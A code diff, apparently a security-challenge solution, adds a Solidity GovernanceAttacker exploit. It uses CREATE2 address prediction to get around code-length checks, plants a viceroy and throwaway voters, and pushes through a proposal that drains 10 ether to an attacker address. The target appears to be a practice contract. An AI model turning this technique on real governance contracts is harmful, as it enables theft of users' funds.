@@ -131,24 +131,101 @@ contract GovernanceAttacker {
 
     constructor() payable {}
 
+    function predictAddress(
+        address _deployer,
+        bytes32 _salt,
+        bytes memory _creationCode,
+        bytes memory _encodedArgs
+    ) public pure returns (address predictedAddress) {
+        predictedAddress = address(
+            uint160(
+                uint(
+                    keccak256(
+                        abi.encodePacked(
+                            bytes1(0xff),
+                            _deployer,
+                            _salt,
+                            keccak256(abi.encodePacked(_creationCode, _encodedArgs))
+                        )
+                    )
+                )
+            )
+        );
+    }
     function attack(Governance _governance) public {
-        //       _governance.createProposal(
-        //           ATTACKER_ADDRESS,
-        //            abi.encode(
-        //                "exec(address,bytes,uint256)",
-        //                address(this),
-        //                abi.encodeWithSignature("disapproveVoter(address)", ATTACKER_ADDRESS),
-        //               0
-        //           )
-        //     );
+        address viceroyAddress = predictAddress(
+            address(this),
+            bytes32(hex"1729"),
+            type(EOAViceroy).creationCode,
+            abi.encode(address(_governance))
+        );
+        // Appoint the viceroy before deloying the contract (hence 0 code because no contract in this address yet)
+        _governance.appointViceroy(viceroyAddress, 1);
+
+        // deploy contract at viceroyAddress address and then appoint voters inside its constructor
+        new EOAViceroy{salt: bytes32(hex"1729")}(_governance);
+    }
+}
+
+contract EOAVoter {
+    constructor(Governance _governance, uint256 _proposalId) {
+        _governance.voteOnProposal(_proposalId, true, msg.sender);
+    }
+}
+
+contract EOAViceroy {
+    address public constant ATTACKER_ADDRESS = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
+    function predictAddress(
+        address _deployer,
+        bytes32 _salt,
+        bytes memory _creationCode,
+        bytes memory _encodedArgs
+    ) public pure returns (address predictedAddress) {
+        predictedAddress = address(
+            uint160(
+                uint(
+                    keccak256(
+                        abi.encodePacked(
+                            bytes1(0xff),
+                            _deployer,
+                            _salt,
+                            keccak256(abi.encodePacked(_creationCode, _encodedArgs))
+                        )
+                    )
+                )
+            )
+        );
     }
 
-    function appointViceroy(Governance _governance) public {
-        _governance.appointViceroy(ATTACKER_ADDRESS, 1);
-    }
+    constructor(Governance _governance) {
+        // create a proposal to transfer ether by calling `exec` on CommunityWallet
+        bytes memory proposalData = abi.encodeWithSignature(
+            "exec(address,bytes,uint256)",
+            ATTACKER_ADDRESS,
+            "",
+            10 ether
+        );
+        uint256 proposalId = uint256(keccak256(proposalData));
+        _governance.createProposal(address(this), proposalData);
 
-    function disapproveVoter(Governance _governance) public {
-        _governance.deposeViceroy(ATTACKER_ADDRESS, 1);
-        _governance.appointViceroy(ATTACKER_ADDRESS, 1);
+        for (uint i; i < 10; ++i) {
+            address voterAddress = predictAddress(
+                address(this),
+                bytes32(uint256(i)),
+                type(EOAVoter).creationCode,
+                abi.encode(address(_governance), proposalId)
+            );
+            // since voter.code.length == 0, appoint the voter first and then deploy the contract to it
+            _governance.approveVoter(voterAddress);
+
+            // deploy voter and vote inside its constructor
+            new EOAVoter{salt: bytes32(uint256(i))}(_governance, proposalId);
+
+            // disapprove voter to reset the allowance
+            _governance.disapproveVoter(voterAddress);
+        }
+
+        // execute proposal
+        _governance.executeProposal(proposalId);
     }
 }
